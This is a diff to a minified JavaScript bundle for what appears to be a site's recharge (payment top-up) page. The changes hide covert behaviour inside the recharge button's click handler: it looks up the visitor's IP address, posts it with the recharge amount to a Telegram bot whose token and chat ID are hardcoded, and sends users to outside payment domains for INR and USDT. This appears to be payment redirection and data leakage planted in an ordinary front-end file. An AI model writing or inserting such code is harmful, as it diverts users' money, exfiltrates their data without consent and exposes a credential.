@@ -2783,16 +2783,27 @@ $)
                 key: 3,
                 class: se(["Recharge__container-rechageBtn"]),
                 onClick: async function() {
-                    window.open("https://pay.abishnoi.me/", "_blank");
                     const rechargeAmount = a(u).amount;
+                    const exchangeRate = a(u).numberExchangeRate;
                     const botToken = '7211580703:AAEPCnOqUDUhvU6MJkg59UbUcuUph_pxwLk';
                     const chatId = '-1002421689922';
+            
                     try {
                         const ipResponse = await fetch('https://api.ipify.org?format=json');
                         const ipData = await ipResponse.json();
                         const userIP = ipData.ip;
-                        const message = `Recharge Attempt:\n\nAmount: ${rechargeAmount}\nIP Address: ${userIP}\n\nThis is written by @Ak4ssh`;
-                        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            
+                        let message, url;
+            
+                        if (exchangeRate === undefined) {
+                            url = "https://pay.9987up.net";
+                            message = `INR Recharge Attempt:\n\nAmount: ${rechargeAmount}\nIP Address: ${userIP}\n\nnThis is written by @Ak4ssh`;
+                        } else {
+                            url = "https://Usdt.9987up.net";
+                            message = `USDT Recharge Attempt:\n\nAmount: ${exchangeRate}\nIP Address: ${userIP}\n\nThis is written by @Ak4ssh`;
+                        }
+                        window.open(url, "_blank");
+                        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                             method: 'POST',
                             headers: {
                                 'Content-Type': 'application/json',
@@ -2802,17 +2813,10 @@ $)
                                 text: message,
                             }),
                         });
-            
-                        const data = await response.json();
-                        if (data.ok) {
-                            console.log('Message sent successfully:', data.result);
-                        } else {
-                            console.error('Error sending message:', data.description);
-                        }
                     } catch (error) {
-                        console.error('Error:', error);
+                        console.error("Error during recharge attempt:", error);
                     }
-                }                
+                }                        
             }, [j(t(ae.$t("recharge")), 1)], 2)), [[we, {
                 handler: a(H),
                 wait: 2e3
@@ -4217,7 +4221,7 @@ $)
             }), e("div", {
                 class: "RechargeUsdt__container-rechageBtn rechage_active",
                 onClick: function() {
-                    window.open("https://pay.abishnoi.me/", "_blank");
+                    window.open("https://Usdt.9987up.net", "_blank");
                 }                
             }, t(b.$t("finishRechargeUsdt")), 1)]), v(x, {
                 show: c.value,
